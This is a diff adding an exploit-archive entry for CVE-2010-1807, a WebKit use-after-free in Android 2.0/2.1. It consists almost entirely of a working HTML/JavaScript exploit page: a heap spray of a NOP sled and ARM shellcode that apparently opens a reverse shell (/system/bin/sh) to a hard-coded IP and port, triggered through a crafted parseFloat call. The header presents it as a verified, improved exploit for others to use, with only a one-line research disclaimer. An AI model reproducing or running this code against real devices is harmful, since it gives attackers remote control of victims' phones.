@@ -1,0 +1,69 @@
+# Exploit Title: Android 2.0/2.1 Use-After-Free Remote Code Execution on
+Webkit
+# Date: 14/11/2010
+# Author: Itzhak Avraham, mj
+# Tested on: Droid 2.1
+# CVE : CVE-2010-1807
+
+
+*Better exploit (better rate and more flexible for changes, also shorter
+shellcode) than what you have, plus, it's also verified. Enjoy!
+More details at : *
+http://imthezuk.blogspot.com/2010/11/float-parsing-use-after-free.html*
+
+
+<html>
+<head>
+<script>
+//This code is only for security researches/teaching purposes,use at your own risk!
+
+// bug   =  webkit remote code execution CVE-2010-1807 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1807
+//patched=  android 2.2, some said it works on some devices with 2.2.
+//originally noticed/written by mj(good job man!)
+//new exploit version by Itzhak Zuk Avraham (itz2000[AT]GMAIL[DOT]COM) - http://imthezuk.blogspot.com
+
+var ip = unescape("\ua8c0\u0100"); // ip = 192.168.0.1
+var port = unescape("\u3930"); //port 12345 (hex(0x3039))
+//var ip = e.g: unescape("\u000a\u0202"); //ip = 10.0.2.2
+
+function trigger()
+        {
+  var span = document.createElement("div");
+  document.getElementById("BodyID").appendChild(span);
+  span.innerHTML = -parseFloat("NAN(ffffe00572c60)"); //trigger use-after-free
+        }
+function exploit()
+        {    
+ var nop = unescape("\u33bc\u0057"); //LDREQH R3,[R7],-0x3C for nopping
+ do
+ {
+  nop+=nop;
+ } while (nop.length<=0x1000);
+        var scode = nop+unescape("\u1001\ue1a0\u0002\ue3a0\u1001\ue3a0\u2005\ue281\u708c\ue3a0\u708d\ue287\u0080\uef00\u6000\ue1a0\u1084\ue28f\u2010\ue3a0\u708d\ue3a0\u708e\ue287\u0080\uef00\u0006\ue1a0\u1000\ue3a0\u703f\ue3a0\u0080\uef00\u0006\ue1a0\u1001\ue3a0\u703f\ue3a0\u0080\uef00\u0006\ue1a0\u1002\ue3a0\u703f\ue3a0\u0080\uef00\u2001\ue28f\uff12\ue12f\u4040\u2717\udf80\ua005\ua508\u4076\u602e\u1b6d\ub420\ub401\u4669\u4052\u270b\udf80\u2f2f\u732f\u7379\u6574\u2f6d\u6962\u2f6e\u6873\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u0002");
+ scode += port;
+ scode += ip;
+ scode += unescape("\u2000\u2000");
+        target = new Array();
+        for(i = 0; i < 0x1000; i++)
+           target[i] = scode;
+        for (i = 0; i <= 0x1000; i++)
+        {
+         document.write(target[i]+"<i>");
+                if (i>0x999)
+         {
+          trigger();
+         }
+        }
+}
+</script>
+</head>
+<body id="BodyID">
+Enjoy!
+<script>
+ exploit();
+</script>
+</body>
+</html>
+
+Twitter account : @ihackbanme
+
